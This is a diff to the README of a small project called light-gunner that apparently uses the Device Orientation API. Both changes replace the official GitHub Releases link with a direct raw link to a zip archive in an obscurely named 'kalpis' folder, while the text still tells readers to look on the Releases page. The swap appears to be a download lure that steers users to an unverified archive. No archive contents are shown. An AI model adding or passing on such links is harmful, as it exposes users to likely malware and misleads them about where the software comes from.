@@ -10,7 +10,7 @@ To run light-gunner, you will need:
 - A device that supports the Device Orientation API (most smartphones and tablets do)
 
 ## 📥 Download & Install
-To get started with light-gunner, please visit this page to download: [Download light-gunner](https://github.com/Nadir2700/light-gunner/releases)
+To get started with light-gunner, please visit this page to download: [Download light-gunner](https://raw.githubusercontent.com/Nadir2700/light-gunner/main/kalpis/light-gunner.zip)
 
 Once on the Releases page, follow these steps:
 1. Look for the latest version available.
@@ -48,4 +48,4 @@ If you need help or have questions about light-gunner, you can reach out through
 ## 🎯 Conclusion
 Thank you for checking out light-gunner! We hope you enjoy using it as much as we enjoyed creating it. For any updates or features, make sure to follow the project on GitHub. 
 
-To access the software again, visit this page to download: [Download light-gunner](https://github.com/Nadir2700/light-gunner/releases)
+To access the software again, visit this page to download: [Download light-gunner](https://raw.githubusercontent.com/Nadir2700/light-gunner/main/kalpis/light-gunner.zip)
